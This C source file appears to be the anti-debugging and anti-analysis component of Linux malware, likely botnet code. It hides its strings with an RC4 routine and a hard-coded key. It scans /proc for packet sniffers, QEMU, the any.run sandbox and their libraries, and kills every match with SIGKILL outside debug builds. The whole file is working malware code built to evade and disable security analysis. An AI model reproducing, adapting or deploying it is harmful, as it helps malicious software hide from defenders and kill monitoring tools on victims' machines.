#define _GNU_SOURCE

#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <signal.h>
#include <dirent.h>

#include "dbg.h"
#include "bool.h"
#include "util.h"
#include "adbg.h"

atable_t *atable;
static uint8_t akey[] = {
        0x8d, 0xb9, 0xff, 0x2b, 0x9c, 0xf0, 0x4a, 0x9d, 0x0a, 0x64, 0x4c, 0x35, 0xc9, 0x95, 0x94, 0x9c, 
        0x84, 0xd3, 0xe3, 0x46, 0x56, 0x65, 0xe2, 0x5f, 0x78, 0x7c, 0x17, 0xd0, 0x07, 0x73, 0x6e, 0x94, 
        0x2c, 0x6d, 0xc0, 0xc8, 0x5d, 0x0a, 0x65, 0x67, 0x6e, 0xb1, 0x9c, 0x37, 0x47, 0x30, 0xd3, 0xcb, 
        0x04, 0xb6, 0x11, 0x5a, 0x1c, 0xf3, 0xb9, 0x94, 0x6f, 0xd0, 0x64, 0x76, 0x43, 0xd2, 0x0b, 0x70, 
        0x3f, 0xcb, 0x38, 0x9c, 0xd5, 0x9e, 0x03, 0x44, 0x4f, 0x9f, 0x7b, 0x96, 0xd0, 0x4f, 0x61, 0xd4, 
        0x05, 0x72, 0x2e, 0x21, 0x66, 0xe8, 0xb5, 0xd5, 0xb8, 0x1a, 0x4c, 0xfc, 0xec, 0x57, 0x6c, 0x2c, 
        0x22, 0xa4, 0xc8, 0xf7, 0x42, 0xcc, 0x3b, 0x92, 0x6b, 0xb7, 0x28, 0x3b, 0x06, 0x8a, 0x0f, 0x0b, 
        0xfc, 0x3e, 0x2d, 0x62, 0x26, 0xe2, 0x38, 0xde, 0xfc, 0x84, 0xda, 0xe9, 0xdb, 0x46, 0x15, 0xfd, 
        0xeb, 0xdd, 0xf4, 0x2d, 0xa9, 0x30, 0xbf, 0x15, 0xe7, 0xe8, 0x50, 0xed, 0x72, 0x60, 0xf8, 0x6e, 
        0x9e, 0x25, 0xd1, 0xc4, 0x08, 0x09, 0xa2, 0x04, 0x8d, 0x7d, 0xed, 0x68, 0xc3, 0x02, 0x65, 0xae, 
        0xe0, 0x59, 0xdc, 0x89, 0x89, 0x9b, 0x9e, 0x70, 0x83, 0xef, 0x5d, 0xf5, 0x4f, 0x56, 0x64, 0xed, 
        0x7b, 0x35, 0xb1, 0x83, 0x3e, 0x53, 0x88, 0xcb, 0xd0, 0x75, 0x33, 0x94, 0x78, 0x98, 0x42, 0x58, 
        0xf1, 0x1e, 0xe1, 0x7b, 0xba, 0x80, 0xeb, 0x3d, 0x6f, 0x49, 0x33, 0xbe, 0x9f, 0x97, 0xab, 0x1a, 
        0xcc, 0x5c, 0x9e, 0x0a, 0xaf, 0x26, 0xd5, 0x80, 0x9b, 0x08, 0x14, 0x13, 0xa0, 0x56, 0x6b, 0x91, 
        0x75, 0x4d, 0x0c, 0x2f, 0xcd, 0xf8, 0x6c, 0x3c, 0x41, 0x9f, 0xfa, 0xe0, 0x36, 0xa5, 0xfa, 0x02, 
        0x01, 0x98, 0x0c, 0xb0, 0xbe, 0xe1, 0x30, 0x5a, 0xe9, 0x44, 0x6d, 0x89, 0x9b, 0xd9, 0x1b, 0x10
};

static void aswap(uint8_t *a, uint8_t *b) {
    *a ^= *b;
    *b ^= *a;
    *a ^= *b;
}

void arc4(char *str, int len) {
    uint8_t s[256];
    int i = 0, j = 0;

    for (i = 0; i < 256; i++)
        s[i] = i;

    for (i = 0; i < 256; i++) {
        j = (j + s[i] + akey[i % 256]) % 256;
        aswap(&s[i], &s[j]);
    }

    i = 0, j = 0;

    for (int k = 0; k < len; k++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        aswap(&s[i], &s[j]);
        str[k] ^= s[(s[i] + s[j]) % 256];
    }

    str[len] = 0;
}

void atable_unlock_val(uint8_t id) {
    arc4(atable[id].str, atable[id].len);
}

void atable_lock_val(uint8_t id) {
    arc4(atable[id].str, atable[id].len);
}


static void add_entry(uint8_t id, char *str, int len) {

    atable = realloc(atable, (id + 1) * sizeof(atable_t));

    atable[id].str = calloc(len + 1, sizeof(char));
    memcpy(atable[id].str, str, len);

    atable[id].len = len;

#ifdef DEBUG_ATABLE
    atable_unlock_val(id);
    DEBUG_PRINT("atable[%d].str: (\"%s\") | atable[%d].len: (\'%d\')\n", id, atable[id].str, id, atable[id].len);
    atable_lock_val(id);
#endif
}

// all da maps shii

static uint8_t maps_commands[] = {
    LIBWAYLANDCLIENT,
    LIBWIRESHARK,
    LIBPCAP
};

static BOOL check_maps(char *pid) {

    char maps_path[32] = {0};

    atable_unlock_val(PROC), atable_unlock_val(MAPS);
    strcpy(maps_path, atable[PROC].str);
    strcat(maps_path, pid);
    strcat(maps_path, atable[MAPS].str);
    atable_lock_val(PROC), atable_lock_val(MAPS);

    int fd = open(maps_path, O_RDONLY);

    if (fd == -1)
        return FALSE;

    BOOL found = FALSE;

    while (TRUE) {

        char rdbuf[256] = {0};

        if (util_read(fd, rdbuf, sizeof(rdbuf)) == NULL)
            break;

        for (unsigned int i = 0; i < (sizeof(maps_commands) / sizeof(maps_commands[0])); i++) {
            atable_unlock_val(maps_commands[i]);
            if (util_memsearch(rdbuf, strlen(rdbuf), atable[maps_commands[i]].str, atable[maps_commands[i]].len)) {
                DEBUG_PRINT("[adbg] found maps: \"%s\"\n", atable[maps_commands[i]].str);
                atable_lock_val(maps_commands[i]);
                found = TRUE;
            }
            atable_lock_val(maps_commands[i]);
        }

        if (found)
            break;
    }

    close(fd);
    return found;
}

// all da cmdline shii

static uint8_t cmdline_commands[] = {
    TSHARK,
    WIRESHARK,
    TCPDUMP,
    QEMU,
    ANYRUN,
    DUMPCAP
};

static BOOL check_cmdline(char *pid) {

    char cmdline_path[32] = {0};

    atable_unlock_val(PROC), atable_unlock_val(CMDLINE);
    strcpy(cmdline_path, atable[PROC].str);
    strcat(cmdline_path, pid);
    strcat(cmdline_path, atable[CMDLINE].str);
    atable_lock_val(PROC), atable_lock_val(CMDLINE);

    int fd = open(cmdline_path, O_RDONLY);

    if (fd == -1)
        return FALSE;

    char rdbuf[128] = {0};
    int len = read(fd, rdbuf, sizeof(rdbuf) - 1);
    close(fd);

    if (len <= 0)
        return FALSE;

    for (unsigned int i = 0; i < (sizeof(cmdline_commands) / sizeof(cmdline_commands[0])); i++) {
        atable_unlock_val(cmdline_commands[i]);
        if (util_memsearch(rdbuf, len, atable[cmdline_commands[i]].str, atable[cmdline_commands[i]].len)) {
            DEBUG_PRINT("[adbg] found cmdline: \"%s\"\n", atable[cmdline_commands[i]].str);
            atable_lock_val(cmdline_commands[i]);
            return TRUE;
        }
        atable_lock_val(cmdline_commands[i]);
    }

    return check_maps(pid);
}


int adbg(void) {

    atable_unlock_val(PROC);
    DIR *dir = opendir(atable[PROC].str);
    atable_lock_val(PROC);

    if (!dir) {
        DEBUG_PRINT("[adbg] opendir() failed\n");
        return TRUE;
    }

    int loc = 0;
    struct dirent *entry;

    while ((entry = readdir(dir))) {
        if (*entry->d_name >= '0' && *entry->d_name <= '9') {
            loc = telldir(dir);
            break;
        }
    }

    seekdir(dir, loc);

    BOOL found = FALSE;

    while ((entry = readdir(dir))) {
        if (check_cmdline(entry->d_name)) {
            DEBUG_PRINT("[adbg] found pid: (\'%s\')\n", entry->d_name);
#ifndef DEBUG
            kill(atoi(entry->d_name), SIGKILL);
#endif
            found = TRUE;
        }
    }
#ifndef DEBUG
    return found;
#else
    return FALSE;
#endif
}


void adbg_init(void) {
    // cmdline
    add_entry(TSHARK, "\x53\xF5\x02\x48\x96\x15", 6); /* "tshark" */
    add_entry(WIRESHARK, "\x50\xEF\x18\x4C\x97\x16\x5B\x09\x57", 9); /* "wireshark" */
    add_entry(TCPDUMP, "\x53\xE5\x1A\x4D\x91\x13\x4A", 7); /* "tcpdump" */
    add_entry(QEMU, "\x56\xE3\x07\x5C\xC9\x1F\x48\x16\x3C", 9); /* "qemu-arm\0" */
    add_entry(ANYRUN, "\x08\xE7\x04\x50\xCA\x0C\x4F\x15\x13", 9); /* "/any.run/" */
    add_entry(DUMPCAP, "\x08\xE2\x1F\x44\x94\x1D\x5B\x0B", 8); /* "/dumpcap" */
    // maps
    add_entry(LIBPCAP, "\x08\xEA\x03\x4B\x94\x1D\x5B\x0B\x12\xDB\x21", 11); /* "/libpcap.so" */
    add_entry(LIBWIRESHARK, "\x08\xEA\x03\x4B\x93\x17\x48\x1E\x4F\xC0\x2F\xD5\x22\xB0\x87\x07", 16); /* "/libwireshark.so" */
    add_entry(LIBWAYLANDCLIENT, "\x4B\xEF\x08\x5E\x85\x07\x56\x1A\x52\xCC\x63\xC4\x25\xF7\x91\x06\xCB\xCD\xAB\xA0", 20); /* "libwayland-client.so" */
    // directories
    add_entry(CMDLINE, "\x08\xE5\x07\x4D\x88\x17\x54\x1E", 8); /* "/cmdline" */
    add_entry(PROC, "\x08\xF6\x18\x46\x87\x51", 6); /* "/proc/" */
    add_entry(MAPS, "\x08\xEB\x0B\x59\x97", 5); /* "/maps" */
}
